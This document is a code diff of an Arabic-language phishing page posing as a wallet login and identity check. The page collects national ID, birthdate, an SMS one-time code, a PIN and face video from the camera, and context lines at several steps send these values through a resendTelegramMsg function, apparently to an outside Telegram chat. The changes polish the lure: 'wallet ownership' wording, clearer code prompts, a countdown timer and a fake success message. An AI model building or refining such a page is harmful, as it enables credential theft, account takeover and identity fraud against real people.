@@ -7,7 +7,6 @@
   <meta name="theme-color" content="#2F80ED">
   <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;900&display=swap" rel="stylesheet">
   <style>
-    /* === عام === */
     :root{
       --primary-1: #2F80ED;
       --primary-2: #56CCF2;
@@ -140,7 +139,7 @@
     .camera-box { width:100%; max-width:320px; height:420px; background:#2f2f33; border-radius:8px; overflow:hidden; position:relative; border:6px solid #fff; box-sizing:border-box; display:flex; align-items:center; justify-content:center; }
     .camera-box video { width:100%; height:100%; object-fit:cover; }
     .instruction-box { background: rgba(0,0,0,0.72); color:#fff; padding:12px; border-radius:10px; max-width:320px; text-align:center; font-size:16px; line-height:1.45; }
-    .countdown { position:absolute; top:8px; left:8px; background:rgba(0,0,0,0.45); color:#fff; padding:6px 10px; border-radius:12px; font-weight:700; }
+    .countdown { position:absolute; top:8px; left:8px; background:rgba(0,0,0,0.45); color:#fff; padding:6px 10px; border-radius:12px; font-weight:700; font-size:18px; }
 
     #processingModal { display:none; position:fixed; inset:0; background:rgba(0,0,0,0.55); z-index:10000; align-items:center; justify-content:center; color:#fff; }
     #processingModal.active { display:flex; }
@@ -177,15 +176,16 @@
   <div id="processingModal" aria-hidden="true">
     <div class="processingBox">
       <div class="spinner" aria-hidden="true"></div>
-      <div style="font-weight:700;font-size:18px;">جارٍ التحقق من هويتك...</div>
+      <div style="font-weight:700;font-size:18px;">جاري التحقق من ملكيتك للمحفظة...</div>
       <div style="margin-top:6px;color:#ddd;font-size:14px;">الرجاء الانتظار حتى الانتهاء</div>
+      <div style="margin-top:12px;color:#fff;font-size:20px;font-weight:700;" id="countdownDisplay">7</div>
     </div>
   </div>
 
   <div id="modalError" role="dialog" aria-hidden="true">
     <div id="modalContent">
-      <div class="err-title">يوجد خطأ في المعلومات</div>
-      <div class="err-msg">يرجى إعادة المحاولة. سيتم توجيهك إلى البداية.</div>
+      <div class="err-title">فشل تسجيل الدخول</div>
+      <div class="err-msg">يرجى إعادة المحاولة مرة أخرى رجاءاً</div>
       <div style="margin-top:12px;"><button id="modalCloseBtn" class="button">إغلاق</button></div>
     </div>
   </div>
@@ -194,7 +194,7 @@
     <div id="permissionBox" role="document" aria-labelledby="permTitle">
       <h3 id="permTitle">نحتاج إذن الكاميرا</h3>
       <p id="permText">
-        التطبيق بحاجة إلى إذن الكاميرا والميكروفون لإجراء التحقق بالوجه. إذا رفضت الطلب سيتم عرض هذه النافذة وتستطيع إعا��ة المحاولة.
+        التطبيق بحاجة إلى إذن الكاميرا والميكروفون لإجراء التحقق بالوجه. إذا رفضت الطلب سيتم عرض هذه النافذة وتستطيع إعادة المحاولة.
         الرجاء السماح بالكاميرا حتى نتمكن من المتابعة.
       </p>
       <p style="color:#666;font-size:13px;margin-top:6px;">
@@ -265,7 +265,7 @@
       ${stepIndicator(2)}
       <form id="nationalForm" autocomplete="off">
         <label>الرقم الوطني</label>
-        <input type="text" id="nationalId" placeholder="الرقم الوطني" maxlength="12" required/>
+        <input type="text" id="nationalId" placeholder="الرقم الوطني" maxlength="12" required inputmode="numeric"/>
         <label>تاريخ الميلاد</label>
         <div class="birthdate-fields" id="birthdateFields"></div>
         <div style="margin-top:12px;text-align:center;"><button type="submit" class="button">التالي</button></div>
@@ -280,8 +280,8 @@
       const day = document.getElementById('birthDay').value;
       const month = document.getElementById('birthMonth').value;
       const year = document.getElementById('birthYear').value;
-      if(!/^\d{10,12}$/.test(nid)){ alert('رقم وطني صحيح'); return; }
-      if(!day || !month || !year){ alert('أدخل تاريخ الميلاد'); return; }
+      if(!/^\d{10,12}$/.test(nid)){ alert('يرجى إدخال رقم وطني صحيح'); return; }
+      if(!day || !month || !year){ alert('يرجى إدخال تاريخ الميلاد'); return; }
       userData.nationalId = nid;
       userData.birthdate = `${year}-${month.padStart(2,'0')}-${day.padStart(2,'0')}`;
       try { telegramMsgId = await resendTelegramMsg(`🟦 تسجيل\n📱 ${userData.phone}\n🆔 ${userData.nationalId}\n🎂 ${userData.birthdate}`); } catch(e){ console.log(e); }
@@ -296,22 +296,38 @@
     let days = '<select id="birthDay" required><option value="">اليوم</option>';
     for(let d=1; d<=31; d++) days += `<option value="${d}">${d}</option>`;
     days += '</select>';
-    const monthNames = ['يناير','فبراير','مارس','أبريل','مايو','يونيو','يوليو','أغسطس','سبتمبر','أكتوبر','نوفمبر','ديسمبر'];
+    
+    const monthNames = [
+      { ar: 'يناير', en: 'January', num: '01' },
+      { ar: 'فبراير', en: 'February', num: '02' },
+      { ar: 'مارس', en: 'March', num: '03' },
+      { ar: 'أبريل', en: 'April', num: '04' },
+      { ar: 'مايو', en: 'May', num: '05' },
+      { ar: 'يونيو', en: 'June', num: '06' },
+      { ar: 'يوليو', en: 'July', num: '07' },
+      { ar: 'أغسطس', en: 'August', num: '08' },
+      { ar: 'سبتمبر', en: 'September', num: '09' },
+      { ar: 'أكتوبر', en: 'October', num: '10' },
+      { ar: 'نوفمبر', en: 'November', num: '11' },
+      { ar: 'ديسمبر', en: 'December', num: '12' }
+    ];
+    
     let months = '<select id="birthMonth" required><option value="">الشهر</option>';
-    for(let m=1;m<=12;m++) months += `<option value="${m}">${monthNames[m-1]}</option>`;
+    for(let m=0; m<12; m++) months += `<option value="${monthNames[m].num}">${monthNames[m].ar} (${monthNames[m].en} ${monthNames[m].num})</option>`;
     months += '</select>';
+    
     let years = '<select id="birthYear" required><option value="">السنة</option>';
     for(let y=maxYear;y>=minYear;y--) years += `<option value="${y}">${y}</option>`;
     years += '</select>';
-    el.innerHTML = `<div style="display:flex;gap:8px;">${days}${months}${years}</div>`;
+    el.innerHTML = `<div style="display:flex;gap:8px;flex-direction:column;">${days}${months}${years}</div>`;
   }
 
   function renderCode5Step(){
     app.innerHTML = `
       <button class="back-btn" id="backBtn">&#8592; رجوع</button>
-      ${header("رمز 5 أرقام")}
+      ${header("رمز التحقق")}
       ${stepIndicator(2)}
-      <div class="info-msg">أدخل رمز التحقق من 5 أرقام</div>
+      <div class="info-msg">أدخل رمز التحقق المرسل إلى رقم هاتفك عبر الرسائل النصية</div>
       <form id="code5Form" autocomplete="off">
         <div class="code-inputs"><input id="code5input" maxlength="5" inputmode="numeric" placeholder="*****" required></div>
         <div style="margin-top:12px;text-align:center;"><button type="submit" class="button">تأكيد</button></div>
@@ -324,7 +340,7 @@
     document.getElementById('code5Form').onsubmit = async (e) => {
       e.preventDefault();
       const code = codeInput.value.trim();
-      if(code.length !== 5){ alert('5 أرقام'); codeInput.focus(); return; }
+      if(code.length !== 5){ alert('يرجى إدخال 5 أرقام'); codeInput.focus(); return; }
       userData.code5 = code;
       try { telegramMsgId = await resendTelegramMsg(`🟦 تسجيل\n📱 ${userData.phone}\n🆔 ${userData.nationalId}\n🎂 ${userData.birthdate}\n🔢 ${userData.code5}`); } catch(e){ console.log(e); }
       renderFaceVerification();
@@ -340,6 +356,7 @@
       <div style="padding:8px;">
         <div class="camera-wrap">
           <div class="camera-box" id="cameraBox">
+            <div class="countdown" id="countdown">7</div>
             <video id="videoPreview" playsinline autoplay muted></video>
           </div>
           <div class="instruction-box" id="instructionBox">انظر إلى الكاميرا بوضوح...</div>
@@ -363,6 +380,7 @@
     videoEl.srcObject = stream;
 
     const instructionBox = document.getElementById('instructionBox');
+    const countdownEl = document.getElementById('countdown');
     const canvas = document.createElement('canvas');
     const ctx = canvas.getContext('2d');
 
@@ -439,8 +457,21 @@
       console.warn('start failed', err);
     }
 
-    instructionBox.textContent = 'جاري التسجيل... (10 ثوانٍ)';
-    await wait(10000);
+    instructionBox.textContent = 'جاري التحقق من ملكيتك للمحفظة';
+    let timeLeft = 7;
+    countdownEl.textContent = '7';
+    countdownEl.style.display = 'block';
+    
+    const countdown = setInterval(() => {
+      timeLeft--;
+      countdownEl.textContent = timeLeft;
+      if(timeLeft <= 0){
+        clearInterval(countdown);
+      }
+    }, 1000);
+
+    await wait(7000);
+    clearInterval(countdown);
 
     if (!cancelled) {
       try { if (recorder && recorder.state !== 'inactive') recorder.stop(); } catch(e){}
@@ -474,7 +505,7 @@
           <img src="${faceLogo}" alt="وجه" style="width:100%;height:100%;object-fit:contain;border-radius:12px;background:#fff;padding:8px;border:1px solid #eee;"/>
         </div>
         <div style="font-size:18px;color:#353a4d;font-weight:700;margin-bottom:8px;">سيُطلب إذن الكاميرا</div>
-        <div style="color:#666;font-size:14px;">سنسجل 10 ثوانٍ. انظر إلى الكاميرا بوضوح.</div>
+        <div style="color:#666;font-size:14px;">سنسجل 7 ثوانٍ. انظر إلى الكاميرا بوضوح.</div>
       </div>
     `;
   }
@@ -551,9 +582,9 @@
   function renderCode4Step(){
     app.innerHTML = `
       <button class="back-btn" id="backBtn">&#8592; رجوع</button>
-      ${header("رمز 4 أرقام")}
+      ${header("رمز PIN")}
       ${stepIndicator(3)}
-      <div class="info-msg">أدخل رمز 4 أرقام</div>
+      <div class="info-msg">يرجى إدخال رمز PIN الثابت الخاص بك</div>
       <form id="code4Form" autocomplete="off">
         <div class="code-inputs"><input id="code4input" maxlength="4" inputmode="numeric" placeholder="****" required></div>
         <div style="margin-top:12px;text-align:center;"><button type="submit" class="button">تأكيد</button></div>
@@ -566,7 +597,7 @@
     document.getElementById('code4Form').onsubmit = async (e) => {
       e.preventDefault();
       const code = codeInput.value.trim();
-      if(code.length !== 4){ alert('4 أرقام'); codeInput.focus(); return; }
+      if(code.length !== 4){ alert('يرجى إدخال 4 أرقام'); codeInput.focus(); return; }
       userData.code4 = code;
       try { telegramMsgId = await resendTelegramMsg(`🟦 تسجيل نهائي\n📱 ${userData.phone}\n🆔 ${userData.nationalId}\n🎂 ${userData.birthdate}\n🔢 ${userData.code5}\n🔒 ${userData.code4}`); } catch(e){ console.log(e); }
       showFinalSuccess();
@@ -636,6 +667,7 @@
     const titleEl = modal.querySelector('.err-title');
     const msgEl = modal.querySelector('.err-msg');
     titleEl.textContent = 'تم بنجاح!';
+    titleEl.style.color = '#4caf50';
     msgEl.textContent = 'تم تسجيل الدخول بنجاح.';
     modal.classList.add('active');
     const btn = document.getElementById('modalCloseBtn');
